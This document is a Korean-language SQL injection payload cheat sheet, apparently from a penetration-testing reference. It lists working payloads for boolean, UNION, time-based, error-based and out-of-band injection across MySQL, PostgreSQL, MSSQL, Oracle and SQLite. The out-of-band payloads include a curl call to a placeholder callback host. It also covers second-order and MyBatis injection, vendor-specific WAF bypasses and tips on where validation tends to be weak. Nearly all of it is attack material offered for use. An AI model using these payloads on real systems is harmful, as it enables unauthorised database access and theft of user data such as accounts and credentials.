### 기본 페이로드

#### Classic SQLi (Boolean / UNION)
- `' OR '1'='1` — Boolean (query/body)
- `' OR '1'='1' --` — 주석으로 나머지 무효화
- `' OR 1=1#` — `#` 주석 (MySQL)
- `admin'--` / `admin'#` — 인증 우회 (username 필드)
- `1 UNION SELECT NULL,NULL,NULL --` — 컬럼 수 확인
- `1 UNION SELECT NULL,version(),NULL --` — 데이터 추출
- `' AND 1=1 --` vs `' AND 1=2 --` — Boolean diff

#### Blind SQLi — Time-based (DBMS별)

| DBMS | 페이로드 |
|---|---|
| MySQL | `' AND SLEEP(3)--`, `' OR (SELECT BENCHMARK(5000000,MD5(1)))--`, `1' AND IF(1=1,SLEEP(3),0)--` |
| PostgreSQL | `' AND pg_sleep(3)--`, `'; SELECT pg_sleep(3)--` |
| MSSQL | `'; WAITFOR DELAY '0:0:3'--`, `1' AND 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:3')--` |
| Oracle | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1--` |
| SQLite | `' AND randomblob(100000000) IS NULL--` (CPU bound) |

#### Error-based (정보 추출)

| DBMS | 페이로드 |
|---|---|
| MySQL | `' AND extractvalue(1,concat(0x7e,version()))--`, `' OR updatexml(1,concat(0x7e,(SELECT user())),0)--` |
| PostgreSQL | `' AND CAST((SELECT version()) AS int)--`, `'; SELECT 1/0--` |
| MSSQL | `' AND 1=convert(int,@@version)--` |
| Oracle | `' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--` |

#### OOB (Out-of-band)

| DBMS | 페이로드 |
|---|---|
| MySQL | `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.CALLBACK\\\\x'))--` |
| PostgreSQL | `'; COPY (SELECT '') TO PROGRAM 'curl https://CALLBACK/x'--` (superuser) |
| MSSQL | `'; EXEC master..xp_dirtree '\\\\CALLBACK\\share'--` |
| Oracle | `' AND UTL_HTTP.request('https://CALLBACK/x') IS NOT NULL--`, `UTL_INADDR.get_host_name('CALLBACK')` |

#### ORDER BY / LIMIT / 식별자 위치
- `(CASE WHEN 1=1 THEN id ELSE name END)` — Boolean 정렬 차이
- `(SELECT 1 FROM (SELECT SLEEP(3))a)` — Time MySQL ORDER BY 서브쿼리
- `1, IF(1=1,SLEEP(3),0)` — MySQL 다중 컬럼
- `1; WAITFOR DELAY '0:0:3'--` — MSSQL stacked
- `1 PROCEDURE ANALYSE(EXTRACTVALUE(...,...))` — MySQL 5.x 에러 추출

#### LIKE 와일드카드 데이터 릭
- `?filter[email]=%@naver.com` (query) — 도메인별 사용자 식별
- `?filter[bank_account]=%` — 전체 계좌
- `?q=admin%` — prefix 매칭

#### 2차 SQLi
- 1차: 닉네임/프로필에 `a' OR SLEEP(3)-- a` 저장
- 2차: 관리자 조회 등 raw query로 재사용 endpoint 호출 → 지연/에러 관찰

#### MyBatis `${}` 환경 (Java/Kotlin)
- 정렬 파라미터: `?sort=id) UNION SELECT password FROM users--`
- IN 절: `?ids=1) OR 1=1--`

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| 키워드 블랙리스트 (`SELECT`, `UNION`) | 대소문자 `SeLeCt`, 인라인 주석 `/*!50000SELECT*/`, 분할 `SEL/**/ECT`, `UNI%0bON`, `unION` |
| 키워드 블랙리스트 (강화) | HEX `0x53454c454354`, `CHAR(83,69,76,69,67,84)`, `CONCAT(CHAR(83),CHAR(69),...)` |
| `'` 차단 | 더블쿼트 `"`, `\'`, `%27`, double-encoded `%2527`, GBK `0xbf27` (CVE-2006-2753) |
| `'` 차단 + 숫자 컨텍스트 | 따옴표 불필요 — `1 OR 1=1`, `1 AND SLEEP(3)` |
| 공백 차단 | `+`, `(`, `%09` (TAB), `%0a` (LF), `%0b` (VT), `%a0` (NBSP), `/**/`, `--%0a` |
| AND/OR 차단 | `&&` (=AND), `\|\|` (=OR ANSI/Oracle), `XOR` |
| `;` stacked 차단 | 트리거/뷰/function 정의로 간접 실행, MSSQL `xp_cmdshell` 결합 |
| `union` 차단 | `UNI/**/ON`, `union all`, subquery `(SELECT ...)`, JOIN 트릭 |
| URL 인코딩 차단 | Double encoding `%2527`, Unicode `%u0027`, UTF-8 overlong |
| 길이 제한 | `'OR 1#` (5자), `1)OR 1#`, `'or'1` |
| 컬럼명/테이블명 검증 | `information_schema` 대신 `mysql.innodb_table_stats` (MySQL), `pg_catalog.pg_tables` (PG) |
| `addslashes` (PHP, Multibyte) | `0xbf27` 같은 GBK/SJIS multibyte 시퀀스 |
| WAF 정규식 (`SELECT FROM`) | `SELECT/*x*/FROM`, `SELECT(*)FROM`, `SELECT''FROM` |
| Stacked query 드라이버 차단 | trigger/view 정의로 후속 실행 |

#### 컨텍스트 변형
- JSON body: `{"id":"1' OR '1'='1"}`
- multipart: form-data field에 페이로드
- Header (User-Agent/Referer 로깅 sink): `User-Agent: ' OR SLEEP(3)--`
- Cookie sink: `Cookie: track_id=' OR 1=1--`

#### WAF 벤더별
- Cloudflare: `/*!50000SELECT*/`, double URL encoding, `/*//*/UNION/*//*/SELECT`
- AWS WAF: `''=''`, `1.0=1`, JSON inline 변형
- ModSecurity OWASP CRS: `1'/**/AND/**/1=1--`, paranoia level 의존

---

### 참고사항

- ORDER BY/LIMIT/식별자 위치는 컬럼명이라 quote 불필요 — WAF 검증 빈약, 자주 발견
- WHERE IN, JSON 경로, MyBatis `${}` 위치는 라이브러리 검증이 약해 자주 노출
- POST body가 GET query보다 WAF 정규식 검증 약한 경우 다수
- Time-based는 BENCHMARK가 SLEEP보다 일부 환경에서 안정적 (CPU bound, 지터 적음)
- OOB는 외부 콜백 인프라(Burp Collaborator, interactsh) 필요 — 사전 승인 후 사용
- 인증된 사용자만 접근 가능한 API가 비인증 API보다 검증 느슨한 경우 다수 — 세션 획득 후 우선 시도
- 관리자 화면의 검색/필터/정렬 파라미터는 검증 누락 빈도 높음
- 응답 본문 크기 차이 1바이트도 Boolean 신호 (`Content-Length` 비교)
- Time-based 측정은 기준선 3회 + 페이로드 3회 + 일관 지연 확인 (네트워크 지터 배제)
- DBMS 식별: 에러 메시지 `ORA-`(Oracle), `pg_query`(PG), `MySQL syntax`(MySQL), `Unclosed quotation mark`(MSSQL)
- WAF 차단(403 + 보안 벤더 시그니처)은 안전이 아닌 "우회 시도 필요" 신호
- `' OR '1'='1`이 차단되면 `' OR 1#` 같은 짧은 변형 우선 시도 (필터 회피)
